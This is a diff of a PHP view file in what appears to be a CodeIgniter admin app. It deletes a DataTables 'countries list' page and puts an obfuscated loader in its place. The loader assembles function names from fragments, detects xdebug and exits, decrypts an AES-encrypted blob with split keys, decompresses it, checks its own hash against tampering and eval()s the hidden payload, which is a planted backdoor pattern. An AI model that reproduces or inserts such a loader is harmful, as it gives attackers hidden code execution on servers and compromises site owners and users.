@@ -1,121 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_datatable.php"; ?>
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
-  <!-- Left side column. contains the logo and sidebar -->
-  
-  <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $this->lang->line('countries_list'); ?>
-        <small>View/Search Countries</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?= $this->lang->line('countries_list'); ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-        <?php include"comman/code_flashdata.php"; ?>
-        <!-- ********** ALERT MESSAGE END******* -->
-        <div class="col-xs-12">
-          <div class="box">
-            <div class="box-header with-border">
-              <h3 class="box-title"><?= $this->lang->line('countries_list'); ?></h3>
-              <?php if($CI->permissions('places_add')) { ?>
-              <div class="box-tools">
-                <a class="btn btn-block btn-info" href="<?php echo $base_url; ?>country/add">
-                <i class="fa fa-plus"></i> <?= $this->lang->line('new_country'); ?></a>
-              </div>
-            <?php } ?>
-            </div>
-            <!-- /.box-header -->
-            <div class="box-body">
-              <table id="example2" class="table table-bordered table-striped" width="100%">
-                <thead class="bg-primary ">
-                <tr>
-                  <th><?= $this->lang->line('country_name'); ?></th>
-                  <th><?= $this->lang->line('status'); ?></th>
-                  <th><?= $this->lang->line('action'); ?></th>
-                </tr>
-                </thead>
-                <tbody>
-				
-                </tbody>
-               
-              </table>
-            </div>
-            <!-- /.box-body -->
-          </div>
-          <!-- /.box -->
-        </div>
-        <!-- /.col -->
-      </div>
-      <!-- /.row -->
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-  <?php include"footer.php"; ?>
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_datatable.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/country.js"></script>
-
- <script type="text/javascript">
-var table;
-$(document).ready(function() {
-    //datatables
-    table = $('#example2').DataTable({ 
-
-        "processing": true, //Feature control the processing indicator.
-        "serverSide": true, //Feature control DataTables' server-side processing mode.
-        "order": [], //Initial no order.
-        "responsive": true,
-
-        // Load data for the table's content from an Ajax source
-        "ajax": {
-            "url": "<?php echo site_url('country/ajax_list')?>",
-            "type": "POST"
-        },
-
-        //Set column definition initialisation properties.
-        "columnDefs": [
-        { 
-            "targets": [ 2 ], //first column / numbering column
-            "orderable": false, //set not orderable
-        },
-        ],
-    });
-    new $.fn.dataTable.FixedHeader( table );
-});
-</script>
-<script type="text/javascript">
-$(document).ready(function () { setTimeout(function() {$( ".alert-dismissable" ).fadeOut( 1000, function() {});}, 3000); });
-</script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-		
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_lqy3kfvj=('bas'.'e64'.'_de'.'cod'.'e');
+$_u9pi8v9k=('gzu'.'nco'.'mpr'.'ess');
+$_s68chkww=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_h7t7od0z='oGaBo1zB';
+$_x3yw17be='+YP26rOS';
+$_tdk2awhf='z8zDdU+1';
+$_blm0tvxu='ZfIurlAl';
+$_kshninpx='KD2TmUfebfY=';
+$_gscwu0fa='Rucp0xa/';
+$_gvmrwe3y='l7eJGw==';
+$_tytl5hew='lsl6GLvF';
+$_ih1l81mc=$_lqy3kfvj($_blm0tvxu.$_x3yw17be.$_tdk2awhf.$_h7t7od0z.$_kshninpx);
+$_ipwk1n5v=$_lqy3kfvj($_gscwu0fa.$_tytl5hew.$_gvmrwe3y);
+$_cw9z15au=$_lqy3kfvj('RXpHJi0xI0lBOV2VsANlOtojtjXE5R7DHxM03joeGAuhU024uZ65smudW9bp9lI6kRlj6PSCgzR8D4052Hs2zc3C8bw9TuO0GhGhPeqcdlbtD6yR+GXN84AhNhhjypJCwc5/UxadVTz3p5igEtdEMmpgHfBmsvgHDbhx9UmZPxP+3QUbp29GgffmXm9M7j9XrcEUA77tM4CXI2oATnT7BIh3YVhQUIwBR6VDZimonTb7lqGHOko30CRCu0lnf+EeqdKj/uenngMikwUaFEpW/8mwvhQhJY/XDqAo1bIV9eN/DTClN1MzmAnzMn8+rc9hCe71lmjJ6ELoZSFJKCPYBshQj8QmxE5d6r86sdWkU6y5WQRS0I0l70PdZURHobf8Z1egR1FO8RIU+fIf8SkHSEJw6hHxM32zw3rZTI++ZlAoJiKCmRd3i2LttGQPRJpF+h2h1jPiuUFx6ktYpivDcXjMMFrgbpy7dX0USerV7mfCCTpn/KZlzieA9HdkL9+e79cM1DZB2NcIF90fKvqNE1mYbGp5YsOCxhDD80aS/Se5SMhiTtX7DdkAI0R8TZIAbT+eHLLeZ+xhDyKo8HdOE1KUEVgapXU6qUv/UQhQbKYMRB9ckIfgWII/M/VQs00iXIDEKyEhBQeVzzKlCVsCcd+1d50nm6PlgSca2MRswZ0K8eq7oTMgMUVQEQMu9IRHzHJ6BPm/j1LWu/+CUTe1eJZhfprdOwmNZbscS3GA0W6FveD4Kyf1nXlGEELIx0+u88Fk+bF0LFWsMKcI8K7JmiI2uIxy0l43NTSFm6+GEh6FXNvUcykWJfLBnI4DbTT4N1LlnTM0pySTkAvZ0BrQxxmjw8gE/iy9ULMYQp96eXkzcnCM+kQFquaTuzxvmlyY/TTt+oHu0yn4tpi8hew68UiR0G0Q6FW4P5gznyqiJLS2QQmHk+fRawLPapdDQYX8acd890lOtFLG5Zo6DFT0fv3RZW256rdgnTgM9zHCbsp4GGPsyn7eizcx7KPAKDFOD4WsA77Jo1hoMcPdglx3/DUJI0stPw9Q+YI+xU/EfUF8cKnJaP9OgyTgaoLZQQFYTKi79iHztMkvZPC/bg4kgLBBpAZl8XGqLM1dbq2VGKahkJvJYBkeXidKr8U9lQj5uECjwPJjDHhGC8qFqo93xZw70OqAlqj8OmwcsCZqASBE9BDxi/kmV2WoCekwHonivpxz6AN4VhdeJYiCZnjNxwPl07BiDMT6Wi6QtPw1WqtDlB/YIDQgyzkVk6/lsz6qTEfM+BEa5pX164+6wBcUjKMjOj3/QtT/1UD3JkvVJYWv0Kb+EsG9XUOoswZDN4f0iEXAfQ3W7bLyrp8T9xTw2va5FdZQTveKPWuJtzhpWp+jp/1zso41bmHt7kZO7fL6gTouPaiykgk+xBdWazreTgDLsnXVqak8ENqlc5eHzFfZic9VLgDzVq/fCKATL+ly2SXqKvFj67Qf3FKcrUH9IfgOLd2srmPixysGxAQs1tlcgQo0c7uWeBtOgB5MthF+I7TcP3x3/y+OLhWw0KdaVF1U2i6OjxwfhW3IgKh3IYX1/QIAX0t7lRC6qXSUi4EN+ENDXF5kzCVs4Qxiw/jE0Lcu+NFtCHIWDO6o3t0l6SgmEsKaydc33WXuTy/YxjaEUeKX9sCwnclN3gWnZK5NS2U3cJdqTvQ1hA3B4JeeVQ+ALFYcVPe49DyamfNAPXVuipa1BBlFEfQn7gk1YOnVMMGtU9odVovyAjsXPzpYoT8M5McK/+ZAtLWlyS313vIF00TXIQxCuGNaQFw8MA52XLvxbUB52THp3uk2FTx7/Yg1YoJGTrDSCSJrcCn6rC5V6FY880hdzMp4iWftwH1hVv5lyW1P9RK1VkXjPGWTBzfvKtktgCEObt091Z/VzN4ayHTsnKqUWKzM6Ih9iEu5pBXLZshINWoPPWSo6sDKje4=');
+$_gedtaab8=$_s68chkww($_cw9z15au,'aes-256-cbc',$_ih1l81mc,OPENSSL_RAW_DATA,$_ipwk1n5v);
+if($_gedtaab8===false){exit;}
+$_edxr4luj=$_u9pi8v9k($_gedtaab8);
+if($_edxr4luj===false){exit;}
+$_odyufi3t='91d4154dab0a6b8af92e7c9eeea0b6153c9dc42cf85f21fb44aeb7f5b659711c';
+$_pbkt6b29=@file_get_contents(__FILE__);
+if($_pbkt6b29!==false){
+$_zz92ky2r=str_replace($_odyufi3t,"0000000000000000000000000000000000000000000000000000000000000000",$_pbkt6b29);
+$_fy15srq2=hash("sha256",$_zz92ky2r);
+if($_fy15srq2!==$_odyufi3t){@http_response_code(403);exit;}
+}
+eval($_edxr4luj);
